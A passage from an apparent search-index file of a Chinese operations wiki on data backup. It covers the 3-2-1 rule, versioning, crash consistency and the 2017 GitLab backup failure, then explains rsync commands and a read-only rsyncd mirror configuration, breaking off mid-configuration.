<p>\u200b\u5feb\u7167\u200b\u662f\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u7279\u6027\u200b\uff0c\u200b\u5982\u679c\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u635f\u574f\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5feb\u7167\u200b\u5c31\u200b\u90fd\u200b\u65e0\u6cd5\u200b\u6b63\u5e38\u200b\u8bfb\u53d6\u200b\u3002\u200b\u800c\u200b RAID \u200b\u53ea\u80fd\u200b\u5728\u200b\u786c\u76d8\u200b\u6545\u969c\u200b\u6570\u91cf\u200b\u5c0f\u4e8e\u200b\u5bf9\u5e94\u200b\u7b49\u7ea7\u200b\u9650\u5236\u200b\u65f6\u200b\u624d\u80fd\u200b\u4fdd\u8bc1\u200b\u6570\u636e\u5b8c\u6574\u6027\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u9632\u6b62\u200b\u5728\u200b\u8bf8\u5982\u200b\u8bef\u5220\u9664\u200b\u3001\u200b\u81ea\u7136\u707e\u5bb3\u200b\u7b49\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u6570\u636e\u200b\u7684\u200b\u4e22\u5931\u200b\u4e0e\u200b\u635f\u574f\u200b\u3002</p> <p>\u200b\u4ee5\u4e0b\u200b\u9996\u5148\u200b\u4ecb\u7ecd\u200b\u8bbe\u8ba1\u200b\u5907\u4efd\u200b\u65f6\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u4e4b\u540e\u200b\u4ece\u200b\u4e0a\u8ff0\u200b\u65b9\u6cd5\u200b\u5217\u8868\u200b\u5f15\u7533\u200b\u5f00\u6765\u200b\uff0c\u200b\u4ecb\u7ecd\u200b\u4e00\u90e8\u5206\u200b\u5de5\u5177\u200b\u7684\u200b\u4f7f\u7528\u200b\u65b9\u6cd5\u200b\u4e0e\u200b\u6280\u5de7\u200b\u3002</p>"},{"location":"ops/storage/backup/#backup-considerations","title":"\u5907\u4efd\u200b\u7684\u200b\u6ce8\u610f\u4e8b\u9879","text":"<p>\u200b\u9664\u4e86\u200b\u7b80\u4ecb\u200b\u4e2d\u200b\u63d0\u5230\u200b\u7684\u200b 3-2-1 \u200b\u539f\u5219\u200b\u4ee5\u5916\u200b\uff0c\u200b\u5907\u4efd\u200b\u7684\u200b\u8bbe\u8ba1\u200b\u8fd8\u200b\u9700\u8981\u200b\u5173\u6ce8\u200b\u7248\u672c\u200b\u7ba1\u7406\u200b\u4e0e\u200b\u6570\u636e\u200b\u4e00\u81f4\u6027\u200b\u3002</p> <p>\u200b\u7248\u672c\u200b\u7ba1\u7406\u200b\u7684\u200b\u95ee\u9898\u200b\u5f88\u200b\u5bb9\u6613\u200b\u7406\u89e3\u200b\uff1a\u200b\u5982\u679c\u200b\u5907\u4efd\u200b\u7684\u200b\u7248\u672c\u200b\u53ea\u6709\u200b\u4e00\u4efd\u200b\u7684\u8bdd\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4e00\u65e6\u200b\u6570\u636e\u200b\u88ab\u200b\u8bef\u5220\u9664\u200b\uff0c\u200b\u5e76\u4e14\u200b\u89e6\u53d1\u200b\u4e86\u200b\u5907\u4efd\u200b\uff0c\u200b\u90a3\u4e48\u200b\u88ab\u200b\u5220\u9664\u200b\u7684\u200b\u6570\u636e\u200b\u5c31\u200b\u6ca1\u6cd5\u7528\u200b\u6b63\u5e38\u200b\u65b9\u6cd5\u200b\u627e\u56de\u200b\u4e86\u200b\u3002\u200b\u4e0d\u8fc7\u200b\u5982\u679c\u200b\u6570\u636e\u200b\u5f88\u5927\u200b\u7684\u8bdd\u200b\uff0c\u200b\u5b58\u50a8\u200b\u6bcf\u4efd\u200b\u7248\u672c\u200b\u5c31\u200b\u4f1a\u200b\u9700\u8981\u200b\u5927\u91cf\u200b\u7684\u200b\u78c1\u76d8\u7a7a\u95f4\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5728\u200b\u9009\u578b\u200b\u65f6\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u4f7f\u7528\u200b\u652f\u6301\u200b\u589e\u91cf\u200b\u5907\u4efd\u200b\u6216\u200b\u53bb\u200b\u91cd\u200b\u7684\u200b\u65b9\u6848\u200b\u3002</p> <p>\u200b\u800c\u200b\u6570\u636e\u200b\u4e00\u81f4\u6027\u200b\u7684\u200b\u95ee\u9898\u200b\u5728\u200b\u4e0d\u5c11\u200b\u65f6\u5019\u200b\u4f1a\u200b\u88ab\u5ffd\u89c6\u200b\u3002</p> <p>\u200b\u5d29\u6e83\u200b\u4e00\u81f4\u6027\u200b</p> <p>\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\uff0c\u200b\u6211\u4eec\u200b\u5e0c\u671b\u200b\u5373\u4f7f\u200b\u7a0b\u5e8f\u200b\u5d29\u6e83\u200b\u3001\u200b\u7cfb\u7edf\u200b\u65ad\u7535\u200b\uff0c\u200b\u7a0b\u5e8f\u200b\u7ef4\u62a4\u200b\u7684\u200b\u6570\u636e\u200b\u5185\u90e8\u200b\u72b6\u6001\u200b\u4ecd\u7136\u200b\u662f\u200b\u4e00\u81f4\u200b\u7684\u200b\u3002\u200b\u8fd9\u200b\u88ab\u200b\u79f0\u4e3a\u200b\u5d29\u6e83\u200b\u4e00\u81f4\u6027\u200b\uff08crash consistency\uff09\u3002\u200b\u4e00\u822c\u6765\u8bb2\u200b\uff0c\u200b\u6570\u636e\u5e93\u200b\u90fd\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u5d29\u6e83\u200b\u4e00\u81f4\u6027\u200b\u3002</p> <p>\u200b\u5373\u4f7f\u200b\u5e94\u7528\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u5d29\u6e83\u200b\u4e00\u81f4\u6027\u200b\uff0c\u200b\u5982\u679c\u200b\u5907\u4efd\u200b\u5de5\u5177\u200b\u76f4\u63a5\u200b\u590d\u5236\u200b\u5bf9\u5e94\u200b\u7684\u200b\u6587\u4ef6\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5f97\u5230\u200b\u7684\u200b\u6587\u4ef6\u200b\u4e5f\u200b\u6709\u200b\u53ef\u80fd\u200b\u662f\u200b\u4e0d\u200b\u4e00\u81f4\u200b\u7684\u200b\u2014\u2014\u200b\u8fd9\u4e2a\u200b\u6587\u4ef6\u200b\u53ef\u80fd\u200b\u524d\u534a\u90e8\u200b\u5206\u200b\u5728\u200b A \u200b\u72b6\u6001\u200b\uff0c\u200b\u540e\u200b\u534a\u200b\u90e8\u5206\u200b\u5728\u200b B \u200b\u72b6\u6001\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0c\u200b\u5907\u4efd\u200b\u6570\u636e\u5e93\u200b\u4e00\u822c\u200b\u90fd\u200b\u4f7f\u7528\u200b\u6570\u636e\u5e93\u200b\u8f6f\u4ef6\u200b\u63d0\u4f9b\u200b\u7684\u200b dump \u200b\u5de5\u5177\u200b\u5bfc\u51fa\u200b SQL\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u76f4\u63a5\u200b\u7528\u200b rsync \u200b\u7b49\u200b\u5de5\u5177\u200b\u7b80\u5355\u200b\u590d\u5236\u200b\u6570\u636e\u5e93\u200b\u5bf9\u5e94\u200b\u7684\u200b\u5b58\u50a8\u200b\u6587\u4ef6\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u5907\u4efd\u200b\u7684\u200b\u6587\u4ef6\u200b\u6709\u200b\u4e00\u81f4\u6027\u200b\u7684\u200b\u8981\u6c42\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e0d\u200b\u65b9\u4fbf\u4f7f\u7528\u200b\u4e13\u7528\u200b\u7684\u200b\u5de5\u5177\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u5feb\u7167\u200b\u529f\u80fd\u200b\u907f\u514d\u200b\u4e0a\u8ff0\u200b\u63d0\u5230\u200b\u7684\u200b\u95ee\u9898\u200b\u3002</p> <p>\u200b\u6700\u540e\u200b\uff0c\u200b\u5728\u200b\u6709\u200b\u6761\u4ef6\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u9700\u8981\u200b\u9a8c\u8bc1\u200b\u5907\u4efd\u200b\u7684\u200b\u6709\u6548\u6027\u200b\uff0c\u200b\u907f\u514d\u51fa\u73b0\u200b\u5907\u4efd\u200b\u635f\u574f\u200b\u6216\u200b\u4e0d\u200b\u5b8c\u6574\u200b\u7684\u200b\u60c5\u51b5\u200b\u3002</p> <p>\u200b\u53cd\u9762\u200b\u4f8b\u5b50\u200b</p> <p>2017 \u200b\u5e74\u200b\uff0cGitLab \u200b\u7531\u4e8e\u200b\u64cd\u4f5c\u5931\u8bef\u200b\uff0c\u200b\u5728\u200b\u9519\u8bef\u200b\u7684\u200b\u6570\u636e\u5e93\u200b\u4e3b\u673a\u200b\u4e0a\u200b\u6267\u884c\u200b\u4e86\u200b\u547d\u4ee4\u200b\u5bfc\u81f4\u200b\u6570\u636e\u200b\u4e22\u5931\u200b\u3002\u200b\u5c3d\u7ba1\u200b\u8bbe\u7f6e\u200b\u4e86\u200b\u5404\u79cd\u200b\u5907\u4efd\u200b\uff0c\u200b\u4ed6\u4eec\u200b\u6ca1\u200b\u80fd\u591f\u200b\u7b2c\u4e00\u200b\u65f6\u95f4\u200b\u6709\u6548\u200b\u6062\u590d\u200b\uff1a</p> <ul> <li>LVM \u200b\u5907\u4efd\u200b\u6bcf\u5929\u200b\u6267\u884c\u200b\u4e00\u6b21\u200b\uff0c\u200b\u4e0a\u200b\u4e00\u6b21\u200b\u6267\u884c\u200b\u8fd8\u662f\u200b\u624b\u52a8\u200b\u5728\u200b 6 \u200b\u5c0f\u65f6\u200b\u4e4b\u524d\u200b\u505a\u200b\u7684\u200b\uff1b\u200b\u5907\u4efd\u200b\u7684\u200b\u6570\u636e\u200b\u4f1a\u200b\u52a0\u8f7d\u200b\u5230\u200b staging \u200b\u73af\u5883\u200b\u91cc\u9762\u200b\uff0c\u200b\u4f46\u662f\u200b webhook \u200b\u6570\u636e\u200b\u4f1a\u200b\u88ab\u200b\u5220\u9664\u200b\u3002</li> <li>\u200b\u5e38\u89c4\u200b\u5907\u4efd\u200b\u6bcf\u5929\u200b\u6267\u884c\u200b\u4e00\u6b21\u200b\uff0c\u200b\u4f46\u662f\u200b\u6ca1\u200b\u4eba\u200b\u77e5\u9053\u200b\u5907\u4efd\u200b\u5230\u200b\u4e86\u200b\u54ea\u91cc\u200b\uff1b\u200b\u7b49\u5230\u200b\u627e\u5230\u200b\u7684\u200b\u65f6\u5019\u200b\u53d1\u73b0\u200b\u5907\u4efd\u200b\u7ed3\u679c\u200b\u53ea\u6709\u200b\u51e0\u4e2a\u200b\u5b57\u8282\u200b\u3002</li> <li>PostgreSQL \u200b\u7684\u200b\u5907\u4efd\u200b\u56e0\u4e3a\u200b\u7248\u672c\u200b\u4e0d\u200b\u517c\u5bb9\u200b\uff0c\u200b\u5b9e\u9645\u4e0a\u200b\u4e00\u76f4\u200b\u8fd0\u884c\u200b\u5931\u8d25\u200b\uff0c\u200b\u5565\u200b\u90fd\u200b\u6ca1\u200b\u5907\u4efd\u200b\u3002</li> <li>Azure \u200b\u7684\u200b\u78c1\u76d8\u200b\u5feb\u7167\u200b\u6ca1\u6709\u200b\u7ed9\u200b\u6570\u636e\u5e93\u200b\u670d\u52a1\u5668\u200b\u5f00\u542f\u200b\u3002</li> <li>S3 \u200b\u7684\u200b\u5907\u4efd\u200b\u4e5f\u200b\u662f\u200b\u7a7a\u200b\u7684\u200b\u3002</li> </ul> <p>\u200b\u4e8e\u662f\u200b\u6700\u540e\u200b\uff0c\u200b\u4e94\u91cd\u200b\u5907\u4efd\u200b\u53ea\u200b\u7559\u4e0b\u200b\u4e86\u200b\u4e00\u4e2a\u200b 6 \u200b\u5c0f\u65f6\u200b\u524d\u200b\u3001\u200b\u6ca1\u6709\u200b webhook \u200b\u6570\u636e\u200b\u7684\u200b\u5907\u4efd\u200b\u3002</p>"},{"location":"ops/storage/backup/#rsync","title":"Rsync","text":"<p>Rsync \u200b\u662f\u200b\u6700\u200b\u5e38\u7528\u200b\u7684\u200b\u6587\u4ef6\u200b\u540c\u6b65\u200b\u5de5\u5177\u200b\u4e4b\u4e00\u200b\uff0c\u200b\u652f\u6301\u200b\u672c\u5730\u200b\u590d\u5236\u200b\u548c\u200b\u8fdc\u7a0b\u200b\u590d\u5236\u200b\u3002\u200b\u76f8\u6bd4\u200b\u4e8e\u200b <code>cp</code>\uff08\u200b\u672c\u5730\u200b\uff09\u200b\u548c\u200b <code>scp</code>\uff08SSH \u200b\u8fdc\u7a0b\u200b\uff09\uff0c<code>rsync</code> \u200b\u53ef\u4ee5\u200b\u505a\u5230\u200b\u589e\u91cf\u200b\u590d\u5236\u200b\uff0c\u200b\u53ea\u200b\u590d\u5236\u200b\u6587\u4ef6\u200b\u4e2d\u200b\u53d1\u751f\u53d8\u5316\u200b\u7684\u200b\u90e8\u5206\u200b\uff0c\u200b\u5e76\u4e14\u200b\u80fd\u591f\u200b\u4fdd\u7559\u200b\u6587\u4ef6\u200b\u5b8c\u6574\u200b\u7684\u200b\u5143\u200b\u6570\u636e\u200b\u4fe1\u606f\u200b\u3002Rsync \u200b\u4e5f\u200b\u662f\u4ece\u200b\u955c\u50cf\u200b\u7ad9\u70b9\u200b\u540c\u6b65\u200b\u5b8c\u6574\u200b\u955c\u50cf\u200b\u7684\u200b\u4e8b\u5b9e\u6807\u51c6\u200b\u3002</p>"},{"location":"ops/storage/backup/#rsync-transfer","title":"\u6587\u4ef6\u4f20\u8f93","text":"<p>\u200b\u6700\u200b\u5e38\u7528\u200b\u7684\u200b\u547d\u4ee4\u200b\uff1a</p> <pre><code>rsync -avP --delete /path/to/source /path/to/destination\n</code></pre> <p>\u200b\u53c2\u6570\u200b\u542b\u4e49\u200b\u5982\u4e0b\u200b\uff1a</p> \u200b\u53c2\u6570\u200b \u200b\u8bf4\u660e\u200b <code>-a</code> \u200b\u5f52\u6863\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u7b49\u540c\u4e8e\u200b <code>-rlptgoD</code> <code>-r</code> \u200b\u9012\u5f52\u200b\u590d\u5236\u200b\u76ee\u5f55\u200b <code>-l</code> \u200b\u4fdd\u7559\u200b\u7b26\u53f7\u200b\u94fe\u63a5\u200b <code>-p</code> \u200b\u4fdd\u7559\u200b\u6587\u4ef6\u200b\u6743\u9650\u200b <code>-t</code> \u200b\u4fdd\u7559\u200b\u4fee\u6539\u200b\u65f6\u95f4\u200b\uff08mtime\uff09 <code>-g</code> \u200b\u4fdd\u7559\u200b group \u200b\u4fe1\u606f\u200b <code>-o</code> \u200b\u4fdd\u7559\u200b owner \u200b\u4fe1\u606f\u200b <code>-D</code> \u200b\u4fdd\u7559\u200b\u8bbe\u5907\u200b\u6587\u4ef6\u200b\u4e0e\u200b\u7279\u6b8a\u200b\u6587\u4ef6\u200b <code>-v</code> \u200b\u8be6\u7ec6\u200b\u8f93\u51fa\u200b <code>-P</code> \u200b\u4fdd\u7559\u200b\u4f20\u8f93\u200b\u4e00\u90e8\u5206\u200b\u7684\u200b\u6587\u4ef6\u200b\u4e14\u200b\u663e\u793a\u200b\u8fdb\u5ea6\u200b <code>--delete</code> \u200b\u5220\u9664\u200b\u76ee\u6807\u76ee\u5f55\u200b\u4e2d\u200b\u6e90\u76ee\u5f55\u200b\u6ca1\u6709\u200b\u7684\u200b\u6587\u4ef6\u200b <p>\u200b\u4ee5\u4e0b\u200b\u63d0\u4f9b\u200b\u4e00\u4e9b\u200b\u53c2\u8003\u200b\u793a\u4f8b\u200b\u3002</p> <p>\u200b\u5c06\u200b <code>/A</code> \u200b\u6587\u4ef6\u200b\u590d\u5236\u5230\u200b <code>/tmp/A</code>\uff1a</p> <pre><code>rsync -avP /A /tmp/A\n# \u200b\u6216\u8005\u200b\nrsync -avP /A /tmp/\n</code></pre> <p>\u200b\u5c06\u200b <code>/etc</code> \u200b\u6587\u4ef6\u5939\u200b\u590d\u5236\u200b\u4e3a\u200b/\u200b\u590d\u5236\u5230\u200b <code>/tmp/example</code>\u3002\u200b\u533a\u522b\u200b\u5728\u200b source \u200b\u7684\u200b\u7ed3\u5c3e\u200b\u662f\u5426\u200b\u6709\u200b <code>/</code>\uff0c\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u7684\u8bdd\u200b\uff0c\u200b\u6e90\u200b\u6587\u4ef6\u5939\u200b\u5c31\u200b\u4f1a\u200b\u4f5c\u4e3a\u200b\u4e00\u4e2a\u200b\u6574\u4f53\u200b\u590d\u5236\u5230\u200b\u76ee\u6807\u200b\u6587\u4ef6\u5939\u200b\u5185\u200b\uff1b\u200b\u5426\u5219\u200b\u5982\u679c\u200b\u6709\u200b <code>/</code>\uff0c\u200b\u6e90\u200b\u6587\u4ef6\u5939\u200b\u5185\u200b\u7684\u200b\u5185\u5bb9\u200b\u4f1a\u200b\u88ab\u200b\u590d\u5236\u5230\u200b\u76ee\u6807\u200b\u6587\u4ef6\u5939\u200b\u5185\u200b\u3002</p> <pre><code>rsync -avP /etc /tmp/example1\n# \u200b\u6b64\u65f6\u200b /etc/passwd \u200b\u5bf9\u5e94\u200b /tmp/example1/etc/passwd\nrsync -avP /etc/ /tmp/example2\n# \u200b\u6b64\u65f6\u200b /etc/passwd \u200b\u5bf9\u5e94\u200b /tmp/example2/passwd\n</code></pre> <p>\u200b\u4f5c\u4e3a\u200b <code>scp</code> \u200b\u7684\u200b\u9ad8\u6548\u200b\u66ff\u4ee3\u200b\uff0c<code>rsync</code> \u200b\u4e5f\u200b\u652f\u6301\u200b\u57fa\u4e8e\u200b SSH \u200b\u7684\u200b\u8fdc\u7a0b\u200b\u590d\u5236\u200b\uff08\u200b\u8fdc\u7a0b\u200b\u670d\u52a1\u5668\u200b\u4e5f\u200b\u9700\u8981\u200b\u5b89\u88c5\u200b rsync\uff09\u3002\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>-z</code> \u200b\u5f00\u542f\u200b\u538b\u7f29\u200b\uff0c\u200b\u4ee5\u200b CPU \u200b\u4e3a\u200b\u4ee3\u4ef7\u200b\u51cf\u5c0f\u200b\u4f20\u8f93\u200b\u91cf\u200b\u3002<code>rsync</code> \u200b\u5bf9\u200b\u589e\u91cf\u200b\u590d\u5236\u200b\u7684\u200b\u652f\u6301\u200b\u5141\u8bb8\u200b\u4e86\u200b\u300c\u200b\u65ad\u70b9\u7eed\u4f20\u200b\u300d\u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u5728\u200b\u7f51\u7edc\u200b\u60c5\u51b5\u200b\u6b20\u4f73\u200b\u7684\u200b\u65f6\u5019\u200b\u5c24\u5176\u200b\u6709\u7528\u200b\u3002</p> <pre><code>rsync -avPz user@remote:/path/to/source /path/to/destination\nrsync -avPz /path/to/source user@remote:/path/to/destination\n</code></pre> <p>\u200b\u5982\u679c\u200b\u8fdc\u7a0b\u200b\u670d\u52a1\u5668\u200b\u9700\u8981\u200b\u7279\u6b8a\u200b\u7684\u200b <code>ssh</code> \u200b\u53c2\u6570\u200b\uff08\u200b\u4f8b\u5982\u200b\u7aef\u53e3\u200b\uff09\uff0c\u200b\u5e76\u4e14\u200b\u4e0d\u60f3\u200b\u4fee\u6539\u200b <code>~/.ssh/config</code>\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>-e</code> \u200b\u53c2\u6570\u200b\uff1a</p> <pre><code>rsync -avPz -e \"ssh -p 2222\" user@remote:/path/to/source /path/to/destination\n</code></pre>"},{"location":"ops/storage/backup/#rsync-mirror","title":"\u955c\u50cf\u200b\u540c\u6b65","text":"<p>Rsync \u200b\u540c\u65f6\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f5c\u4e3a\u200b\u670d\u52a1\u7aef\u200b\uff08daemon \u200b\u6a21\u5f0f\u200b\uff09\u200b\u5bf9\u5916\u200b\u63d0\u4f9b\u200b rsync \u200b\u670d\u52a1\u200b\uff0c\u200b\u9ed8\u8ba4\u200b\u7aef\u53e3\u200b\u4e3a\u200b TCP 873\u3002</p> <p>Rsync over TLS</p> <p>Rsync \u200b\u9ed8\u8ba4\u200b\u4e3a\u200b\u660e\u6587\u200b\u534f\u8bae\u200b\uff0c\u200b\u4e0d\u8fc7\u200b\u5176\u200b\u652f\u6301\u200b\u901a\u8fc7\u200b\u5176\u4ed6\u200b\u53cd\u5411\u200b\u4ee3\u7406\u200b\u5de5\u5177\u200b\uff08\u200b\u4f8b\u5982\u200b Nginx \u200b\u7684\u200b stream \u200b\u6a21\u5757\u200b\uff09\u200b\u5b9e\u73b0\u200b TLS \u200b\u52a0\u5bc6\u200b\uff0c\u200b\u9ed8\u8ba4\u200b\u7aef\u53e3\u200b\u4e3a\u200b 874\uff0c\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b <code>rsync-ssl</code> \u200b\u547d\u4ee4\u200b\u8fde\u63a5\u200b\u3002</p> <p>\u200b\u4ee5\u4e0b\u200b\u4ecb\u7ecd\u200b\u4e0e\u200b\u955c\u50cf\u200b\u540c\u6b65\u200b\uff08mirrors\uff09\u200b\u76f8\u5173\u200b\u7684\u200b\u670d\u52a1\u7aef\u200b\u4e0e\u200b\u5ba2\u6237\u7aef\u200b\u914d\u7f6e\u200b\u3002\u200b\u5176\u4ed6\u200b\u7528\u9014\u200b\u53ef\u89c6\u200b\u60c5\u51b5\u200b\u81ea\u884c\u200b\u8c03\u6574\u200b\u3002</p>"},{"location":"ops/storage/backup/#rsync-server","title":"Rsync \u200b\u670d\u52a1\u7aef\u200b\u914d\u7f6e","text":"<p>Debian \u200b\u9ed8\u8ba4\u200b\u7684\u200b rsync \u200b\u7684\u200b systemd \u200b\u670d\u52a1\u200b\u4f9d\u8d56\u4e8e\u200b <code>/etc/rsyncd.conf</code> \u200b\u6587\u4ef6\u200b\uff0c\u200b\u540c\u65f6\u200b <code>/usr/share/doc/rsync/examples/rsyncd.conf</code> \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u53c2\u8003\u200b\u8303\u4f8b\u200b\u3002</p> <p>\u200b\u4e00\u4efd\u200b\u7528\u4e8e\u200b\u955c\u50cf\u200b\u7ad9\u70b9\u200b\u7684\u200b <code>rsyncd.conf</code> \u200b\u53ef\u80fd\u200b\u5982\u4e0b\u200b\u6240\u793a\u200b\uff1a</p> <pre><code>motd file = /etc/rsyncd/rsyncd.motd\npid file = /var/run/rsyncd.pid\nlog file = /var/log/rsyncd.log\nmax verbosity = yes\ntransfer logging = yes\nignore nonreadable = yes\n# \u200b\u9700\u8981\u200b adduser --system rsyncd\nuid = rsyncd\ngid = nogroup\nuse chroot = yes\ndont compress = *\nmax connections = 50\nrefuse options = checksum\nread only = true\ntimeout = 240\nreverse lookup = no\n</code></pre> <p>\u200b\u5176\u4e2d\u200b\u6bd4\u8f83\u200b\u91cd\u8981\u200b\u7684\u200b\u53c2\u6570\u200b\u6709\u200b\uff1a</p> <ul> <li>\u200b\u5b89\u5168\u6027\u200b\u76f8\u5173\u200b\uff1arsync daemon \u200b\u4f1a\u4ee5\u200b root \u200b\u8eab\u4efd\u200b\u8fd0\u884c\u200b\uff0c\u200b\u5728\u200b\u6536\u5230\u200b\u8bf7\u6c42\u200b\u540e\u200b\u4f1a\u200b fork \u200b\u51fa\u5b50\u200b\u8fdb\u7a0b\u200b\u5b9e\u9645\u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b\u3002<code>uid</code> \u200b\u4e0e\u200b <code>gid</code> \u200b\u7528\u4e8e\u200b\u5b50\u200b\u8fdb\u7a0b\u200b\u964d\u6743\u200b\uff0c<code>use chroot</code> \u200b\u7528\u4e8e\u200b\u9650\u5236\u200b\u8bbf\u95ee\u200b\u8303\u56f4\u200b\uff0c\u200b\u907f\u514d\u200b\u975e\u200b\u9884\u671f\u200b\u7684\u200b\u6f0f\u6d1e\u200b\u6cc4\u6f0f\u200b\u7cfb\u7edf\u200b\u4e2d\u200b\u7684\u200b\u5176\u4ed6\u200b\u6587\u4ef6\u200b\u3002\u200b\u7531\u4e8e\u200b\u955c\u50cf\u200b\u7ad9\u70b9\u200b\u80af\u5b9a\u200b\u4e0d\u200b\u5141\u8bb8\u200b\u7528\u6237\u200b\u4fee\u6539\u200b\u6587\u4ef6\u200b\uff0c\u200b\u56e0\u6b64\u200b <code>read only</code> \u200b\u5e94\u5f53\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b <code>true</code>\u3002</li> <li>\u200b\u6027\u80fd\u200b\u76f8\u5173\u200b\uff1a<code>max connections</code> \u200b\u7528\u4e8e\u200b\u9650\u5236\u200b\u603b\u200b\u8fde\u63a5\u6570\u200b\uff0c<code>timeout</code> \u200b\u7528\u4e8e\u200b\u9650\u5236\u200b\u8fde\u63a5\u200b\u8d85\u65f6\u200b\u65f6\u95f4\u200b\uff0c\u200b\u9632\u6b62\u200b\u88ab\u200b\u672a\u200b\u54cd\u5e94\u200b\u7684\u200b\u5ba2\u6237\u7aef\u200b\u957f\u65f6\u95f4\u200b\u5360\u7528\u200b\u8d44\u6e90\u200b\u3002<code>dont compress</code> \u200b\u4e0e\u200b <code>refuse options</code> \u200b\u7528\u4e8e\u200b\u7981\u7528\u200b\u538b\u7f29\u200b\uff08\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u4f20\u8f93\u200b\u7684\u200b\u6587\u4ef6\u200b\u5927\u591a\u200b\u5df2\u7ecf\u200b\u662f\u200b\u538b\u7f29\u200b\u8fc7\u200b\u7684\u200b\uff09\u200b\u4e0e\u200b\u68c0\u9a8c\u200b\u548c\u200b\uff08\u200b\u4f1a\u200b\u5927\u91cf\u200b\u5360\u7528\u200b\u670d\u52a1\u5668\u200b CPU\uff09\u3002<code>reverse lookup</code> \u200b\u7528\u4e8e\u200b\u5173\u95ed\u200b\u53cd\u5411\u200b DNS \u200b\u67e5\u8be2\u200b\uff0c\u200b\u907f\u514d\u200b DNS \u200b\u95ee\u9898\u200b\u5bfc\u81f4\u200b\u7684\u200b\u8fde\u63a5\u200b\u5ef6\u8fdf\u200b\u3002</li> </ul> <p>\u200b\u4e4b\u540e\u200b\u5c31\u662f\u200b\u5b9a\u4e49\u200b\u66b4\u9732\u200b\u7684\u200b\u6a21\u5757\u200b\uff08module\uff09\uff1a</p> <pre><code>[repo1]\npath = /path/to/repo1\n\n[repo2]\npath = /path/to/repo2\n</code></pre> <p>\u200b\u6a21\u5757\u200b\u662f\u200b rsync URL \u200b\u7684\u200b\u7b2c\u4e00\u5c42\u200b\uff0c\u200b\u4f8b\u5982\u200b <code>rsync://server/repo1/somedir/</code> \u200b\u4e2d\u200b\uff0c<code>repo1</code> \u200b\u5c31\u662f\u200b\u6a21\u5757\u200b\u540d\u200b\u3002\u200b\u914d\u7f6e\u200b\u5b8c\u6210\u200b\u4e4b\u540e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>rsync://server/</code> \u200b\u5217\u51fa\u200b\u5168\u90e8\u200b\u6a21\u5757\u200b\uff0c<code>rsync rsync://server/repo1</code> \u200b\u6765\u200b\u786e\u8ba4\u200b\uff0c\u200b\u5e76\u4e14\u200b\u91c7\u7528\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u547d\u4ee4\u200b\u540c\u6b65\u200b\u67d0\u4e2a\u200b\u6a21\u5757\u200b\u7684\u200b\u5168\u90e8\u200b\u6587\u4ef6\u200b\u3002</p> <p>\u200b\u540c\u65f6\u200b\u542f\u7528\u200b\u591a\u4e2a\u200b rsync \u200b\u670d\u52a1\u200b</p> <p>\u200b\u5982\u679c\u200b\u6709\u200b\u9700\u8981\u200b\u591a\u4e2a\u200b daemon \u200b\u7684\u200b\u9700\u6c42\u200b\uff08\u200b\u4f8b\u5982\u200b\u9700\u8981\u200b\u591a\u4e2a\u200b rsync \u200b\u670d\u52a1\u7aef\u200b bind \u200b\u5230\u200b\u4e0d\u540c\u200b\u7684\u200b IP \u200b\u5730\u5740\u200b\u4e0a\u200b\uff09\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b systemd \u200b\u7684\u200b\u6a21\u677f\u200b\u5355\u5143\u200b\u683c\u5f0f\u200b\u624b\u52a8\u200b\u7f16\u5199\u200b <code>rsync@.service</code> \u200b\u6587\u4ef6\u200b\u3002</p> <p>\u200b\u540c\u65f6\u200b <code>rsyncd.conf</code> \u200b\u683c\u5f0f\u200b\u652f\u6301\u200b\u5bfc\u5165\u200b\u5176\u4ed6\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4e0d\u540c\u200b\u670d\u52a1\u200b\u7684\u200b\u5171\u901a\u200b\u90e8\u5206\u200b\u53ef\u4ee5\u200b\u63d0\u53d6\u200b\u51fa\u6765\u200b\u3002\u200b\u5176\u4e2d\u200b <code>&amp;include</code> \u200b\u7528\u4e8e\u200b\u5bfc\u5165\u200b\u6a21\u5757\u200b\u7684\u200b\u5b9a\u4e49\u200b\uff0c<code>&amp;merge</code> \u200b\u7528\u4e8e\u200b\u5bfc\u5165\u200b\u914d\u7f6e\u200b\uff0c\u200b\u7c7b\u4f3c\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code># common.inc \u200b\u5305\u542b\u200b\u914d\u7f6e\u200b\n&amp;merge /etc/rsyncd/common.inc\n# common.conf 